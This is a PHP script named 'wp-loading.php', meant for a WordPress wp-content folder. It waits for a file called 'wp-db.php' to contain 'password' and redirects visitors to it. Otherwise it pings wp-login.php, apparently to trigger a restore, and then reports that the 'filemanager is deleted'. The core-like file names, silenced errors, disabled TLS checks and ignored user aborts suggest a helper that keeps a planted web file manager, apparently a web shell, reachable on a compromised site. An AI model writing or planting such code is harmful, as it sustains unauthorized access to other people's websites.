<?php
/**
 * wp-loading.php
 *
 * Upload this file to the wp-content folder (the same folder that
 * wp-db.php lives in, or will live in once restored).
 *
 * Flow:
 * 1. Check for wp-db.php in this folder. The file counts as ready only
 *    when its content contains the string "password".
 * 2. Ready -> redirect the visitor to wp-db.php.
 * 3. Not ready -> send a GET request to wp-login.php, wait 2 seconds,
 *    check again.
 * 4. Still not ready -> wait 2 more seconds, check one last time.
 * 5. Still not ready -> print "filemanager is deleted, ask the admin
 *    to upload again".
 *
 * Special case: when the current url contains "/wp/" (WordPress core
 * installed inside a "wp" sub folder), wp-login.php is pinged at
 * https://example.com/wp/wp-login.php
 *
 * Built to be resilient: silent error handling, multiple HTTP transports
 * (cURL -> streams -> raw socket), stat-cache clearing between checks,
 * chunked file scanning, no output before redirects and a JS/meta
 * redirect fallback when headers are already sent.
 */

/* ---------------------------------------------------------------- config --- */

$targetFileName = 'wp-db.php';                                    // file we are waiting for
$marker         = 'password';                                     // string that proves the file is restored
$waitSeconds    = 2;                                              // pause between re-checks
$failMessage    = 'filemanager is deleted, ask the admin to upload again';
$wpSubSegment   = '/wp/';                                         // special-case url segment
$userAgent      = 'Mozilla/5.0 (wp-loading ping)';

/* ------------------------------------------------------- harden runtime --- */

@error_reporting(0);
@ini_set('display_errors', 'Off');
@ini_set('log_errors', 'Off');
@ini_set('default_socket_timeout', '10');
@set_time_limit(120);
@ignore_user_abort(true);

// Drop any pre-existing output buffers so headers can always be sent
while (ob_get_level() > 0) {
    @ob_end_clean();
}
if (!headers_sent()) {
    @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    @header('Pragma: no-cache');
}

/* -------------------------------------------------------------- helpers --- */

/**
 * True when the target file exists AND its content contains the marker.
 * Reads in chunks so a huge file can not blow the memory limit, and keeps
 * a small overlap between chunks so the marker can not be split unseen
 * across a chunk boundary. stat cache is cleared on every call so a file
 * restored moments ago is always detected.
 */
function wpLoadingFileReady($file, $marker)
{
    @clearstatcache();

    if (!@is_file($file) && !@file_exists($file)) {
        return false;
    }

    $markerLen = strlen($marker);
    if ($markerLen < 1) {
        return false;
    }

    $fh = @fopen($file, 'rb');
    if (!is_resource($fh)) {
        // could not open as a stream -> one plain read attempt
        $all = @file_get_contents($file);
        return is_string($all) && $all !== '' && stripos($all, $marker) !== false;
    }

    $keep   = $markerLen - 1;
    $tail   = '';
    $found  = false;
    $errors = 0;

    while (!@feof($fh)) {
        $chunk = @fread($fh, 65536);

        if ($chunk === false || $chunk === '') {
            if (@feof($fh) || ++$errors > 3) {
                break;
            }
            continue; // transient read hiccup, retry
        }
        $errors = 0;

        $buffer = $tail . $chunk;
        if (stripos($buffer, $marker) !== false) {
            $found = true;
            break;
        }
        $tail = ($keep > 0) ? substr($buffer, -$keep) : '';
    }

    @fclose($fh);

    return $found;
}

/**
 * Pause for N seconds. Falls back to usleep / busy-wait when sleep()
 * is unavailable or disabled, so the wait always really happens.
 */
function wpLoadingSleep($seconds)
{
    $end = microtime(true) + (float) $seconds;

    if (function_exists('sleep')) {
        @sleep((int) $seconds);
    }

    $remaining = $end - microtime(true);
    if ($remaining <= 0) {
        return;
    }

    if (function_exists('usleep')) {
        @usleep((int) ($remaining * 1000000));
    }
    while (microtime(true) < $end) {
        // busy-wait fallback, only reached when usleep is unavailable
    }
}

/**
 * HTTPS detection that also works behind reverse proxies / CDNs.
 */
function wpLoadingIsHttps()
{
    if (isset($_SERVER['HTTPS'])) {
        $v = strtolower(trim((string) $_SERVER['HTTPS']));
        if ($v !== '' && $v !== 'off' && $v !== '0' && $v !== 'false') {
            return true;
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])
        && stripos((string) $_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) {
        return true;
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_SSL'])
        && stripos((string) $_SERVER['HTTP_X_FORWARDED_SSL'], 'on') !== false) {
        return true;
    }
    if (!empty($_SERVER['HTTP_CF_VISITOR'])
        && stripos((string) $_SERVER['HTTP_CF_VISITOR'], 'https') !== false) {
        return true;
    }
    if (!empty($_SERVER['REQUEST_SCHEME'])
        && stripos((string) $_SERVER['REQUEST_SCHEME'], 'https') !== false) {
        return true;
    }
    if (isset($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] === 443) {
        return true;
    }

    return false;
}

/**
 * GET a url, trying every transport we have. Failures are ignored on
 * purpose: the polling loop decides the final outcome, not the ping.
 */
function wpLoadingPingUrl($url, $userAgent)
{
    if ($url === '') {
        return;
    }

    // 1) cURL
    if (function_exists('curl_init')) {
        $ch = @curl_init($url);
        if ($ch) {
            @curl_setopt_array($ch, array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS      => 5,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_USERAGENT      => $userAgent,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
            ));
            $response = @curl_exec($ch);
            $errNo    = @curl_errno($ch);
            @curl_close($ch);
            if ($response !== false && $errNo === 0) {
                return;
            }
        }
    }

    // 2) Streams (needs allow_url_fopen)
    $context = @stream_context_create(array(
        'http' => array(
            'timeout'         => 20,
            'ignore_errors'   => true,
            'user_agent'      => $userAgent,
            'follow_location' => 1,
            'max_redirects'   => 5,
        ),
        'ssl' => array(
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ),
    ));
    $data = @file_get_contents($url, false, $context);
    if ($data !== false && $data !== '') {
        return;
    }

    // 3) Raw socket (works even without cURL / allow_url_fopen)
    wpLoadingPingSocket($url, $userAgent);
}

/**
 * Minimal raw-HTTP GET over fsockopen. Last-resort transport.
 */
function wpLoadingPingSocket($url, $userAgent)
{
    $parts = @parse_url($url);
    if ($parts === false || empty($parts['host'])) {
        return;
    }

    $scheme = isset($parts['scheme']) ? strtolower($parts['scheme']) : 'http';
    $port   = isset($parts['port']) ? (int) $parts['port'] : ($scheme === 'https' ? 443 : 80);
    $path   = isset($parts['path']) ? $parts['path'] : '/';
    if (isset($parts['query'])) {
        $path .= '?' . $parts['query'];
    }

    $errno  = 0;
    $errstr = '';
    $transport = ($scheme === 'https') ? 'ssl' : 'tcp';
    $fp = @fsockopen($transport . '://' . $parts['host'], $port, $errno, $errstr, 8);
    if (!is_resource($fp)) {
        return;
    }

    @stream_set_timeout($fp, 12);
    $request = 'GET ' . $path . " HTTP/1.0\r\n"
             . 'Host: ' . $parts['host'] . "\r\n"
             . 'User-Agent: ' . $userAgent . "\r\n"
             . "Connection: close\r\n\r\n";
    @fwrite($fp, $request);

    $read = 0;
    while (!@feof($fp) && $read < 8192) {
        $data = @fread($fp, 1024);
        if ($data === false || $data === '') {
            break;
        }
        $read += strlen($data);
    }
    @fclose($fp);
}

/**
 * Leave for the target url. Uses a Location header when possible and
 * falls back to JS + meta refresh if output already started.
 */
function wpLoadingRedirect($url)
{
    if (!headers_sent()) {
        @header('Location: ' . $url, true, 302);
        exit;
    }

    $safe = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    echo '<!DOCTYPE html><html><head><meta charset="utf-8">'
       . '<meta http-equiv="refresh" content="0;url=' . $safe . '">'
       . '<script>window.location.replace("' . $safe . '");</script>'
       . '</head><body><p>Redirecting&hellip; <a href="' . $safe . '">continue</a></p></body></html>';
    exit;
}

/**
 * Search a url path for the "/wp/" segment and return the base up to and
 * including it, e.g. "/wp" or "/blog/wp". Returns null when absent.
 */
function wpLoadingFindWpBase($scriptDir, $requestPath, $wpSubSegment)
{
    $candidates = array($scriptDir, $requestPath);
    foreach ($candidates as $path) {
        if ($path === '') {
            continue;
        }
        $pos = stripos($path, $wpSubSegment);
        if ($pos !== false) {
            return substr($path, 0, $pos + strlen($wpSubSegment) - 1);
        }
    }

    return null;
}

/**
 * Final failure notice.
 */
function wpLoadingFail($message)
{
    if (!headers_sent()) {
        @header('Content-Type: text/html; charset=utf-8');
    }
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>wp-loading</title></head><body>'
       . htmlspecialchars($message, ENT_QUOTES, 'UTF-8')
       . '</body></html>';
    exit;
}

/* ---------------------------------------------------------- resolve urls --- */

$targetFile = rtrim(str_replace('\\', '/', __DIR__), '/') . '/' . $targetFileName;

$scheme = wpLoadingIsHttps() ? 'https' : 'http';

$host = '';
if (!empty($_SERVER['HTTP_HOST'])) {
    $host = trim((string) $_SERVER['HTTP_HOST']);
} elseif (!empty($_SERVER['SERVER_NAME'])) {
    $host = trim((string) $_SERVER['SERVER_NAME']);
} elseif (!empty($_SERVER['SERVER_ADDR'])) {
    $host = trim((string) $_SERVER['SERVER_ADDR']);
}

// Path used to reach this script, query string stripped
$requestPath = isset($_SERVER['REQUEST_URI']) ? (string) $_SERVER['REQUEST_URI'] : '';
$queryPos = strpos($requestPath, '?');
if ($queryPos !== false) {
    $requestPath = substr($requestPath, 0, $queryPos);
}
$requestPath = str_replace('\\', '/', $requestPath);

// Directory of this script according to the server
$scriptName = isset($_SERVER['SCRIPT_NAME']) ? (string) $_SERVER['SCRIPT_NAME'] : '';
if ($scriptName === '' && isset($_SERVER['PHP_SELF'])) {
    $scriptName = (string) $_SERVER['PHP_SELF'];
}
if ($scriptName !== '') {
    $scriptDir = str_replace('\\', '/', dirname($scriptName));
} elseif ($requestPath !== '') {
    $scriptDir = preg_replace('~/[^/]*$~', '', $requestPath);
} else {
    $scriptDir = '';
}
$scriptDir = rtrim($scriptDir, '/');
if ($scriptDir === '/' || $scriptDir === '.' || $scriptDir === '\\') {
    $scriptDir = '';
}
if ($scriptDir !== '' && $scriptDir[0] !== '/') {
    $scriptDir = '/' . $scriptDir;
}

// Parent directory of the script folder ("" when the script sits at the root)
$parentDir = '';
if ($scriptDir !== '') {
    $parentDir = str_replace('\\', '/', dirname($scriptDir));
    if ($parentDir === '/' || $parentDir === '\\' || $parentDir === '.') {
        $parentDir = '';
    }
}

if ($host !== '') {
    $origin = $scheme . '://' . $host;

    // Special case: url contains /wp/ -> wp-login.php lives at /wp/wp-login.php
    $wpBase = wpLoadingFindWpBase($scriptDir, $requestPath, $wpSubSegment);

    $redirectUrl = $origin . $scriptDir . '/' . $targetFileName;
    $loginPingUrl = ($wpBase !== null)
        ? $origin . $wpBase . '/wp-login.php'
        : $origin . $parentDir . '/wp-login.php';
} else {
    // No host could be resolved: fall back to relative url, skip the ping
    $redirectUrl  = $targetFileName;
    $loginPingUrl = '';
}

/* ------------------------------------------------------------ main flow --- */

// 1) First check
if (wpLoadingFileReady($targetFile, $marker)) {
    wpLoadingRedirect($redirectUrl);
}

// 2) Wake up wp-login.php, wait, check again
wpLoadingPingUrl($loginPingUrl, $userAgent);
wpLoadingSleep($waitSeconds);

if (wpLoadingFileReady($targetFile, $marker)) {
    wpLoadingRedirect($redirectUrl);
}

// 3) Last patience round: wait 2 more seconds, check again
wpLoadingSleep($waitSeconds);

if (wpLoadingFileReady($targetFile, $marker)) {
    wpLoadingRedirect($redirectUrl);
}

// 4) Still nothing -> tell the admin
wpLoadingFail($failMessage);
